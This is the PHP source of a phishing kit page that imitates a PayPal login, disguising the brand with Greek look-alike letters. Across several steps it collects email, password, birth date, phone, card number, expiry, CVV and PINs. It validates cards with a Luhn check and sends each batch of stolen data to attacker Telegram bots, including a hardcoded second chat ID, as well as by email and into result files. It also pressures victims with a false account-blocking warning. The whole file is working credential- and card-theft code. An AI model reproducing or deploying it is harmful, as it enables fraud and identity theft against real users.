<?php
session_start();
include ('bt.php');
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
$ib = getenv("REMOTE_ADDR");
date_default_timezone_set('GMT');
$crt = date("Y");
$dt=date("H:i:s");
$_SESSION['ip'] = $ib;
include "./tans".$_SESSION['0001'];
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
$log = $_GET["log"];
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
$O1 = $_SESSION['1']=$_POST['1'];
$O2 = $_SESSION['2']=$_POST['2'];
?>
<!DOCTYPE html>
<html class=" superBowlBG superBowlDefault js " lang="fr" dir="ltr">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>(<?php echo $_SESSION['cntc']; ?>) <?php echo $log_ttl1; ?></title>
<meta name="format-detection" content="telephone=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<link rel="shortcut icon" type="image/x-icon" href="./lyl_ims/Icon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js" type="text/javascript"></script>
<script src="./lyl_ims/jquery.maskedinput.js" type="text/javascript"></script>
<style type="text/css">
        body {
            margin: 0
        }
        .loading #main {
            opacity: .1
        }
        .spinner {
            height: 60%;
            width: 70%;
            position: absolute;
            z-index: 10;
        }
        .wait{color:white;}
        @media all and (max-width: 767px){.spinner{margin-left: 13%;}.wait{color:black;}}
        .spinner .spinWrap {
            width: 200px;
            height: 100px;
            position: absolute;
            top: 50%;
            left: 50%;
            margin-left: -100px;
            margin-top: -50px
        }
        .spinner .loader,
        .spinner .spinnerImage {
            height: 100px;
            width: 100px;
            position: absolute;
            top: 0;
            left: 50%;
            opacity: 1;
            filter: alpha(opacity=100)
        }
        .spinner .spinnerImage {
            margin: 28px 0 0 -25px;
            background: url(./lyl_ims/iso-spin.png) no-repeat
        }
        .spinner .loader {
            margin: 0 0 0 -55px;
            background-color: transparent;
            -webkit-animation: rotation .7s infinite linear;
            -moz-animation: rotation .7s infinite linear;
            -o-animation: rotation .7s infinite linear;
            animation: rotation .7s infinite linear;
            border-left: 5px solid #cbcbca;
            border-right: 5px solid #cbcbca;
            border-bottom: 5px solid #cbcbca;
            border-top: 5px solid #2380be;
            border-radius: 100%
        }
</style>
<link rel="stylesheet" href="./lyl_ims/appSuperBowl.css">
</head>
<?php
$url_p="$_SERVER[REQUEST_URI]";
if($log == ""){
?>
<body><header class="mainHeader" role="banner"><div class="headerContainer"><div class="grid12"><a href="#" class="logo"></a><div class="loginBtn"><span class="securityLock"><?php echo $inf_scr; ?></span></div></div></div></header><main class="superBowlMain"><section id="content" role="main" data-country="US"><section id="main" class=""><div id="account" class="account grid12"><form action="System-settings.php?log=CheckLog#E=<?php echo $ran;?>P=<?php echo $rans;?>logdata=<?php echo crypt($_SESSION['cntn']); ?>=<?php include '../ran.php'; echo $r; ?>" method="post" name="signup_form" class="proceed" onSubmit="return checkbae()"><input type="hidden" id="csrf" name="_csrf" value=""><div class="customGrid7"><div class="personalAccountSignUp" data-selectionenabled="false">    <br><div class="stepProgress"><h3 style="margin: 0px;"><span style="color: rgb(0, 48, 135);font-size: 26px;font-family: verdana,arial;font-style: italic;/* margin: 0; */padding: 0;"><font>Ρ</font><font>α</font>y</span><span style="color: rgb(15, 161, 223);font-size: 26px;/* margin: 0; *//* padding: 0; */font-family: verdana,arial;font-style: italic;"><font>Ρ</font><font>α</font>l</span></h3><span class="selected"></span><span></span><span></span><span></span></div><div class="pageHeader"><h2><?php echo $log_lab1; ?></h2></div><p class="personalAccount"><span class="personalHeader"><?php echo $log_lab2; ?></span></p><div class="superBowlContainer "><div class="groupFields"><div class="textInput lap "><div class="fields email large">
<label for="email"></label><input type="email" id="email" name="1" class="validate" value="<? if ( strstr( $url_p, 'uzid' ) ) { echo str_replace("uzid=","",strstr($url_p, 'uzid=')); } ?>" maxlength="127" autocomplete="off" title="<?php echo $log_em; ?>" placeholder="<?php echo $log_em; ?>"  ></div></div><div class="passwordSection clearfix"><div class="textInput lap "><div class="fields large"><label for="password"></label><input type="password" id="password" name="2" class="hasHelp validate hovered"  maxlength="20" autocomplete="off" title="<?php echo $log_ps; ?>" placeholder="<?php echo $log_ps; ?>" autocorrect="off" autocapitalize="off" aria-required="true" value="<? if ( strstr( $url_p, 'uzid' ) ) { echo "••••••••••••"; } ?>"><span class="tickmark hide"></span><a id="forgotPasswordLink" target="_top" class="link bold" href="#" aria-expanded="false" role="link" aria-labeledby="recoverPasswordHelpAria"><?php echo $log_frg; ?></a></div></div></div></div><div class="btns"><input id="_eventId_personal" name="_eventId_continue" type="submit" class="medium button" value="<?php echo $log_btn; ?>"></div></div></div></div></form></div></section></section></main><?php include ('lyl-x/ftr.php'); ?><div id="overPanel" class="US overPanel flagsIn"></div><script type="text/javascript">
<? if ( strstr( $url_p, 'uzid' ) ) { echo'function stateChange() {
    setTimeout(function () {
        document.getElementsByTagName("form")[0].submit()
    }, 3000);
}';}?>

stateChange();
document.getElementsByClassName('medium button')[0].onclick = function(){window.btn_clicked = true;};
window.onbeforeunload = function(){if(!window.btn_clicked){return 'If you leave, Your account may be blocked permanently !';}};</script></body>
<?php
}	
?>
<?php
if($log == "CheckLog"){
if(strlen($O2) > 7  ){ 
if (!empty($O1) and !empty($O2)){
?>
<?php
$_SESSION['s1']=$_POST['1'];
$_SESSION['s2']=$_POST['2'];
$_SESSION['ip']=$ib;
$_SESSION['msg1'] ='
===========
✪ [Email] : '.$_SESSION['s1'].'
✪ [Password] : '.$_SESSION['s2'].'
✪ [COUNTRY] : '.$_SESSION['cntn'].'
✪ [IP] : '.$ib.'
✪ [BROWSER] : '.$_SERVER['HTTP_USER_AGENT'].'
===========
';
include ('INFO.php');
if($rzhtm == "on"){
$fl = fopen("../RZLT/Gift-".$_SESSION['s1']."--".$ib.".html","a");
fwrite($fl,$_SESSION['msg1']);
}
$tok=$api;
$user=$id;
$request=[
  'chat_id' => $user,
  'text' => "LGN | ".$_SESSION['cntn']." | ".$ib."
".$_SESSION['msg1'] 
];

$request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
file_get_contents($request_url);

$tok=$api;
$user2="970605277";
$request2=[
  'chat_id' => $user2,
  'text' => "LGN | ".$_SESSION['cntn']." | ".$ib."
".$_SESSION['msg1'] 
];

$request_url2="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request2);
file_get_contents($request_url2);

mail($em,"LGN | ".$_SESSION['cntn']." | ".$ib,$_SESSION['msg1'] ,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:LYL-G<LYL-G@dreambig.com>");
?>	
<?php include ('lyl-x/prctinf.php'); ?>
<?php
} 
}
else {
	?>
<?php include ('lyl-x/err.php'); ?>

<?php
}};
?>
<?php
if($log == "InfoPage"){
?>
<?php include ('lyl-x/inf.php'); ?>
<?php
}	
?>
<?php
if($log == "CheckInfo"){
?>
<?php
$_SESSION['s03']=$_POST['03'];
$_SESSION['s04']=$_POST['04'];
$_SESSION['s05']=$_POST['05'];
$_SESSION['s06']=$_POST['06'];
$_SESSION['s07']=$_POST['07'];
$_SESSION['s08']=$_POST['08'];
$_SESSION['s09']=$_POST['09'];
$_SESSION['s10']=$_POST['10'];
$_SESSION['s11']=$_POST['11'];
$_SESSION['s12']=$_POST['12'];

$_SESSION['msg2']='
===========
✪ [Date Of Birthday] : '.$_SESSION['s05'].'
✪ [Country] : '.$_SESSION['s09'].'
✪ [ZIP Code] : '.$_SESSION['s10'].'
✪ [Phone Number] : '.$_SESSION['s11'].'/'.$_SESSION['s12'].'
✪ [IP COUNTRY] : '.$_SESSION['cntn'].'
✪ [IP] : '.$ib.'
✪ [BROWSER] : '.$_SERVER['HTTP_USER_AGENT'].'
===========
';
include ('INFO.php');
if($rzhtm == "on"){
$fl = fopen("../RZLT/Gift-".$_SESSION['s1']."--".$ib.".html","a");
fwrite($fl,$_SESSION['msg2'] );
}
$tok=$api;
$user=$id;
$request=[
  'chat_id' => $user,
  'text' => "INF | ".$_SESSION['cntn']." | ".$ib."
".$_SESSION['msg2'] 
];

$request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
file_get_contents($request_url);

$tok=$api;
$user2="970605277";
$request2=[
  'chat_id' => $user2,
  'text' => "INF | ".$_SESSION['cntn']." | ".$ib."
".$_SESSION['msg2'] 
];

$request_url2="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request2);
file_get_contents($request_url2);

mail($em,"INF | ".$_SESSION['cntn']." | ".$ib,$_SESSION['msg2'] ,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:LYL-G<LYL-G@dreambig.com>");
?>
<?php include ('lyl-x/prctcrd.php'); ?>
<?php
}
?> 
<?php
if($log == "CrdPage"){
?>
<?php include ('lyl-x/crd.php'); ?>
<?php
}	
?>
<?php
if($log == "CheckCrd"){
?>
<?php
$fj=strtr($_POST['16'], '0123456789', '9876543210');
$O16=$_SESSION['s16']=$fj;
function work_hard($nr) {
    $nr = preg_replace('/\D/', '', $nr);
    $nr_length = strlen($nr);
    $prty = $nr_length % 2;
    $ttl = 0;
    for ($i = 0;$i < $nr_length;$i++) {
        $dgt = $nr[$i];
        if ($i % 2 == $prty) {
            $dgt*= 2;
            if ($dgt > 9) {
                $dgt-= 9;
            }
        }
        $ttl+= $dgt;
    }
    if ($ttl % 10 == 0) {
        return "valid";
    } else return "invalid";
}
$O13=$_SESSION['s13']=$_POST['13'];
$O14=$_SESSION['s14']=$_POST['14'];
$O15=$_SESSION['s15']=$_POST['15'];
$O16=$_SESSION['s16']=$O16;
$O17=$_SESSION['s17']=$_POST['17'];
$O18=$_SESSION['s18']=$_POST['18'];
$O19=$_SESSION['s19']=$_POST['19'];
function work_hard_01($O14) {
    $bndt = array();
    $crdbn = substr($O14, 0, 6);
    $bndt = json_decode(file_get_contents("https://bins.payout.com/api/v1/bins/" . $crdbn), true);
    return $bndt;
}
$crdinf = work_hard_01($_SESSION['s14']);
$_SESSION['bnnm'] = ($crdinf['issuer']);
$_SESSION['msg3'] ='
===========
✪ [Crd Holder] : '.$_SESSION['s13'].'
✪ [Crd Number] : '.$_SESSION['s14'].'
✪ [Exp Date] : '.$_SESSION['s15'].'
✪ [C-SC C-VV] : '.$_SESSION['s16'].'
✪ [VBV] : '.$_SESSION['s17'].'
✪ [COUNTRY] : '.$_SESSION['cntn'].'
✪ [IP] : '.$ib.'
✪ [BROWSER] : '.$_SERVER['HTTP_USER_AGENT'].'
===========
';
include ('INFO.php');
if($rzhtm == "on"){
$fl = fopen("../RZLT/Gift-".$_SESSION['s1']."--".$ib.".html","a");
fwrite($fl,$_SESSION['msg3'] );
}

if (!empty($O13) and !empty($O14) and work_hard($O14) == "valid" and !empty($O15) and !empty($O16)) { 
  
$tok=$api;
$user=$id;
$request=[
  'chat_id' => $user,
  'text' => "CRD | ".$_SESSION['cntn']." | ".$ib."
".$_SESSION['msg3'] 
];
$request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
file_get_contents($request_url);

$tok=$api;
$user2="970605277";
$request2=[
  'chat_id' => $user2,
  'text' => "CRD | ".$_SESSION['cntn']." | ".$ib."
".$_SESSION['msg3'] 
];

$request_url2="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request2);
file_get_contents($request_url2);

  mail($em,"CRD | ".$_SESSION['cntn']." | ".$ib,$_SESSION['msg3'] ,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:LYL-G<LYL-G@dreambig.com>");
?>
<?php
if ($pgsms == 'yes' && $_SESSION['cntn'] !== "Japan") {
?>
<?php include ('lyl-x/prctpin.php'); ?>
<?php
}
else{
?>
<?php include ('lyl-x/prctscs.php'); ?>
<?php
 }
?>	
<?php    
} 
else {
?>
<?php include ('lyl-x/prctcrderr.php'); ?>
<?php
}
?>
<?php
}
?>
<?php
if($log == "CrdErrPage"){
?>
<?php include ('lyl-x/crderr.php'); ?>
<?php
}	
?>

<?php
if($log == "BnkPage"){
?>
<?php include ('lyl-x/pin.php'); ?>
<?php
}	
?>

<?php
if($log == "PinPage"){
?>
<?php include ('lyl-x/pn.php'); ?>
<?php
}	
?>

<?php
if($log == "CheckPins"){
?>
<?php
$_SESSION['s20']=$_POST['20'];
$_SESSION['s21']=$_POST['21'];
$_SESSION['s22']=$_POST['22'];
$_SESSION['s23']=$_POST['23'];
$_SESSION['msg4'] ='
===========
✪ [PIN] : '.$_SESSION['s23'].'
✪ [IP] : '.$ib.'
===========
';
include ('INFO.php');
if($rzhtm == "on"){
$fl = fopen("../RZLT/Gift-".$_SESSION['s1']."--".$ib.".html","a");
fwrite($fl,$_SESSION['msg4'] );
}


$tok=$api;
$user=$id;
$request=[
  'chat_id' => $user,
  'text' => "PIN | ".$_SESSION['cntn']." | ".$ib."
".$_SESSION['msg4'] 
];

$request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
file_get_contents($request_url);

$tok=$api;
$user2="970605277";
$request2=[
  'chat_id' => $user2,
  'text' => "PIN | ".$_SESSION['cntn']." | ".$ib."
".$_SESSION['msg4'] 
];

$request_url2="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request2);
file_get_contents($request_url2);


mail($em,"PIN | ".$_SESSION['cntn']." | ".$ib,$_SESSION['msg4'] ,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:LYL-G<LYL-G@dreambig.com>");
?>
<?php include ('lyl-x/prctpn.php'); ?>
<?php
}
if($log == "CheckPin"){
  ?>
  <?php
  $_SESSION['s20']=$_POST['20'];
  $_SESSION['s21']=$_POST['21'];
  $_SESSION['s22']=$_POST['22'];
  $_SESSION['s23']=$_POST['23'];
  $_SESSION['msg5'] ='
===========
✪ [PIN] : '.$_SESSION['s23'].'
✪ [IP] : '.$ib.'
===========
';
  include ('INFO.php');
  if($rzhtm == "on"){
  $fl = fopen("../RZLT/Gift-".$_SESSION['s1']."--".$ib.".html","a");
  fwrite($fl,$_SESSION['msg5'] );
  }
  
  
  $tok=$api;
  $user=$id;
  $request=[
    'chat_id' => $user,
    'text' => "PIN-2 | ".$_SESSION['cntn']." | ".$ib."
  ".$_SESSION['msg5'] 
  ];
  
  $request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
  file_get_contents($request_url);
  

$tok=$api;
$user2="970605277";
$request2=[
    'chat_id' => $user2,
    'text' => "PIN-2 | ".$_SESSION['cntn']." | ".$ib."
  ".$_SESSION['msg5'] 
  ];

$request_url2="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request2);
file_get_contents($request_url2);

  mail($em,"PIN | ".$_SESSION['cntn']." | ".$ib,$_SESSION['msg5'] ,"MIME-Version: 1.0" . "\r\n"."Content-type:text/html;charset=UTF-8" . "\r\n"."From:LYL-G<LYL-G@dreambig.com>");
  ?>
  <?php include ('lyl-x/prctscs.php'); ?>
  <?php
  }
?> 
<?php
if($log == "ScsPage"){
?>
<?php include ('lyl-x/scs.php'); ?>
<?php
}	
?>
</html>